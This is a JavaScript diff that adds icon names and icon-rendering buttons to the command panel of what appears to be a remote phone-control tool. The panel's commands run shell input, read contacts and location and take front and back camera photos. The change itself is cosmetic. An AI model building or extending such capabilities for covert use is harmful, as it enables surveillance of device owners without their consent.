@@ -132,6 +132,7 @@ const commands = {
     command: {
         fn: exec,
         title: "Command Input",
+        icon: "terminal",
         inputs: {
             command: {
                 placeholder: "Command..."
@@ -141,6 +142,7 @@ const commands = {
     clear: {
         fn: exec,
         title: "Clear Output",
+        icon: "trash",
         inputs: {
             cmd: {
                 type: "hidden",
@@ -151,6 +153,7 @@ const commands = {
     ls: {
         fn: exec,
         title: "List Files",
+        icon: "list",
         inputs: {
             cmd: {
                 type: "hidden",
@@ -161,6 +164,7 @@ const commands = {
     mkdir: {
         fn: makeDirectory,
         title: "Make Directory",
+        icon: "plus-square",
         inputs: {
             name: {
                 placeholder: "Directory Name"
@@ -170,6 +174,7 @@ const commands = {
     speed: {
         fn: setSpeed,
         title: "Set Speed",
+        icon: "fast-forward",
         inputs: {
             speed: {
                 type: "number",
@@ -179,15 +184,18 @@ const commands = {
     },
     battery: {
         fn: getBattery,
-        title: "Get Battery"
+        title: "Get Battery",
+        icon: "battery"
     },
     location: {
         fn: getLocation,
-        title: "Get Location"
+        title: "Get Location",
+        icon: "map-pin",
     },
     vibrate: {
         fn: vibrate,
         title: "Vibrate",
+        icon: "smartphone",
         inputs: {
             millis: {
                 type: "number",
@@ -197,11 +205,13 @@ const commands = {
     },
     torch: {
         fn: torch,
-        title: "Torch"
+        title: "Torch",
+        icon: "sun"
     },
     notify: {
         fn: notify,
         title: "Notify",
+        icon: "alert-circle",
         inputs: {
             title: {
                 placeholder: "Title..."
@@ -213,12 +223,14 @@ const commands = {
     },
     contacts: {
         fn: getContacts,
-        title: "Get Contacts"
+        title: "Get Contacts",
+        icon: "book"
     },
 
     front_photo: {
         fn: takePhoto,
         title: "Front Photo",
+        icon: "skip-forward|camera",
         inputs: {
             id: {
                 type: "hidden",
@@ -235,6 +247,7 @@ const commands = {
     back_photo: {
         fn: takePhoto,
         title: "Back Photo",
+        icon: "skip-back|camera",
         inputs: {
             id: {
                 type: "hidden",
@@ -270,10 +283,13 @@ commandTypes.forEach(commandType => {
         const input = inputs[inputType];
         // return `<input value="${input.value || ''}" type="${input.type || 'text'}" placeholder="${input.placeholder || ''}" name="${inputType}"/>`;
     }).join("\n")}
-    <button type="submit">${command.title}</button>
+    <button type="submit">${
+        command.icon.split("|").map(icon => `<i data-feather="${icon}"></i>`).join('')
+    }</button>
     `;
 
     input.append(widget);
+    feather.replace();
 
     widget.addEventListener("submit", async e => {
         e.preventDefault();
